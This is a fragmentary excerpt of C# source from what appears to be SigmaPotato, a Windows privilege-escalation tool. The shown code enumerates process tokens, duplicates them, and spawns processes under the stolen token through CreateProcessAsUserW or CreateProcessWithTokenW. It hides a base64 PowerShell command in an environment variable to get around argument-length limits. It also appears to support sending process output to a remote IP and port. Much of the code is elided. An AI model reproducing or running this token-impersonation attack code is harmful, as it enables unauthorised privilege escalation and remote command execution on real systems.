  ...
  [In] uint dwOptions
    ...
    public class ProcessToken
    {
        ...
        private static ProcessToken _Cast(IntPtr targetProcessToken, int targetProcessPid, IntPtr targetProcessHandle, IntPtr tokenHandle)
        {
            ...
            // TOKEN_INFORMATION_CLASS Enumation: https://docs.microsoft.com/en-us/windows/win32/api/winnt/ne-winnt-token_information_class
    ...
    public class TokenUtils
    {
        ...
        public static ProcessToken[] ListProcessTokens(int targetPid, ListProcessTokensCallback listProcessTokensCallback)
        {
            ...
            for (int i = 0; i < shteis.Length; i++)
            {
                ...
                if (targetPid > 0 && handleEntryPid == targetPid 
                    || targetPid <= 0
                    )
                {
                    ...
                    //GrantedAccess 0x0012019f 有可能会导致堵塞 (what?)
        ...
        public static bool CreateProcess(IntPtr tokenHandle, string commandLine, bool bInheritHandles, uint dwCreationFlags, ref STARTUPINFO startupinfo, out PROCESS_INFORMATION processInformation, string IpAddress, int Port) // NEW BABY
        {
            ...
            if (tokenType != TOKEN_TYPE.TokenPrimary)
            {
                    ...
                    out tmpTokenHandle))
                {
                    ...
                    Console.WriteLine($"[+] New Token Handle: {tmpTokenHandle}");
            ...
            // SigmaPotato: Attempting to bypass 1024 character arg limit by passing argument into an environment variable.

            /*
            string bootstrap = "powershell -e ($env:Sigma.ToString())";           // None
            string bootstrap = "powershell -e ($([string]$env:Sigma))";           // Of
            string bootstrap = "powershell -e ([String]::Concat($env:Sigma))";    // These
...
";
                ...
                // Store base64 command as a local Environment Variable
                if (NativeMethod.SetEnvironmentVariable(envVar, b64Command))
                {
                        Console.WriteLine($"[+] {envMessage} base64 encoded and set to local environment variable: '$env:{envVar}'");
                }
                else
                {
                    Console.WriteLine("[-] Failed to set local environment variable.");
                }


                // Create new environment block containing the command-injected environment variable
                if (NativeMethod.CreateEnvironmentBlock(out environmentBlock, tokenHandle, true))
                {
                    Console.WriteLine("[+] Environment block inherited local environment variables.");
                    commandLine = bootstrap;
                    Console.WriteLine($"[+] New Command to Execute: '{commandLine}'");
                }
                else
                {
                    Console.WriteLine($"[-] Environment block failed to create.");
                }


                // Unicode environment flag required to for process to accept environment block.
                if ((dwCreationFlags & (uint)ProcessCreateFlags.CREATE_UNICODE_ENVIRONMENT) != 0)
                {
                    Console.WriteLine("[+] 'CREATE_UNICODE_ENVIRONMENT' process creation flag is already set.\n---");
                }
                else
                {
                    Console.WriteLine("[+] Setting 'CREATE_UNICODE_ENVIRONMENT' process flag.\n---");
                    dwCreationFlags |= (uint)ProcessCreateFlags.CREATE_UNICODE_ENVIRONMENT;
                }
            }
        ...
        , environmentBlock, null, ref startupinfo, out processInformation))
            {
                Console.WriteLine("[+] Creating Process via 'CreateProcessAsUserW'");
                isCreate =  true;
            }
            else if (NativeMethod.CreateProcessWithTokenW(tokenHandle, 0, null, commandLine, dwCreationFlags, environmentBlock, null, ref startupinfo,
                out processInformation))
            {
                Console.WriteLine("[+] Creating Process via 'CreateProcessWithTokenW'");
                isCreate =  true;
            }
                    ...
                    out processInformation, IpAddress, Port))
            {
                ...
                while (true)
                {
                    ...
                    if (bytesAvail > 0)
                    {
                        ...
                        // Attempting to exclude ugly CLIXML PowerShell process output (could catch false positives)
                        read = childProcessReadStream.Read(readBytes, 0, readBytes.Length);
                        outString = Encoding.Default.GetString(readBytes, 0, read);
